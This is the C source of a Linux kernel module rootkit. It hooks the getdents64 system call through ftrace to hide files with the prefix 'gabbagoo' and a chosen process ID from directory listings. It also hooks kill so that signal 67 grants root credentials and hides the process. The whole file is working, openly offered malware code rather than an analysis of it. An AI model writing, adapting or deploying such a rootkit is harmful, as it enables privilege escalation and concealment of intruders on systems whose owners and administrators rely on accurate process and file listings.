#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/namei.h>
#include <linux/version.h>

// dirent == directory entry
#include <linux/dirent.h>

#include "ftrace_helper.h"

#define PREFIX "gabbagoo"
#define PREFIX_LEN sizeof(PREFIX) - 1

static char hide_pid[8 + 1] = {0};

static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
static asmlinkage long (*orig_kill)(const struct pt_regs *regs);

asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
	    /* Get userspace dirent struct from pt_regs */
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    /* Declare our kernel direct struct and offset */
    struct linux_dirent64 *previous_dir, *current_dir, *dirent_kern = NULL;
    unsigned long offset = 0;

    /* Error value */
    long error;

    /* Call real getdents64 and alloc our dirent struct */
    int ret = orig_getdents64(regs);

    if (ret <= 0)
        return ret;

    dirent_kern = kzalloc(ret, GFP_KERNEL);

    if (dirent_kern == NULL)
        return ret;

    /* Copy dirent from userspace into our kernel dirent */
    error = copy_from_user(dirent_kern, dirent, ret);
    if (error)
        goto done;
    
    /* Mess with directory entries */
    while (offset < ret) {

        current_dir = (void *)dirent_kern + offset;

        if (memcmp(PREFIX, current_dir->d_name, PREFIX_LEN) == 0) 
        {
            pr_info("Found %s\n", current_dir->d_name);
            if (current_dir == dirent_kern) 
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            } 
            
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else if (strncmp(hide_pid, "", NAME_MAX) != 0 && memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) 
        {
            pr_info("Found PID: %s\n", current_dir->d_name);
            if (current_dir == dirent_kern) 
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            } 
            
            previous_dir->d_reclen += current_dir->d_reclen;
        } 
        else 
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    /* Copy data back */
    error = copy_to_user(dirent, dirent_kern, ret);

done:
    kfree(dirent_kern);
    return ret;
}

asmlinkage long hook_kill(struct pt_regs *regs)
{
	pid_t pid = regs->di; // RDI
	int signal = regs->si; // RSI

	if (signal == 67)
	{
		memset(hide_pid, 0, 8);
		snprintf(hide_pid, 8, "%d", pid);

		pr_info("Elevating PID(%d) to root and hiding the process\n", pid);

		commit_creds(prepare_kernel_cred(0));
		return 0;
	}

	// If not our special signal, operate normally
	return orig_kill(regs);
}

// Hooks designated functions using ftrace
static struct ftrace_hook hooks[] = {
    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("sys_kill", hook_kill, &orig_kill),
};

// Module Init function - executed on module load (insmod)
static int __init load(void)
{
	int ret = 0;

	pr_info("rootkits are cool!\n");
	ret = fh_install_hooks(hooks, ARRAY_SIZE(hooks));

	return ret;
}

// Module Exit function - executed on module unload (rmmod)
static void __exit unload(void)
{
	pr_info("Goodbye cruel world ;(\n");
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(load);
module_exit(unload);

// Licensing and other required shenanigans
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Oreomeister");
MODULE_DESCRIPTION("Totally not sus");
MODULE_VERSION("1.0");